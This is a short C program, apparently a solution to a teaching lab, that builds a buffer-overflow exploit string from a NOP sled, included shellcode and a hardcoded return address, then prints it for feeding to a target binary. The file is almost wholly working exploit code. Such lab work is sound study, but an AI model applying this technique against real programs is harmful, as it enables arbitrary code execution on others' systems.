#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running "<target> $(sploit)"
 * in your terminal.
 */

const char NOP = '\x90';

int main(void) {
    char exploit[242] = {0};
    char jump_addr[] = "\x30\x05\x80\x40";

    for (size_t i = 0;
        i < (sizeof(exploit) - sizeof(shellcode) - sizeof(jump_addr));
        i++) {
        exploit[i] = NOP;
    }

    strncat(exploit,shellcode,sizeof(exploit)-strlen(exploit)-2);

    strncat(exploit, jump_addr, sizeof(exploit) - strlen(exploit) - 2);

    exploit[sizeof(exploit) - 2] = 0x78;

    printf("%s", exploit);

    return 0;
}
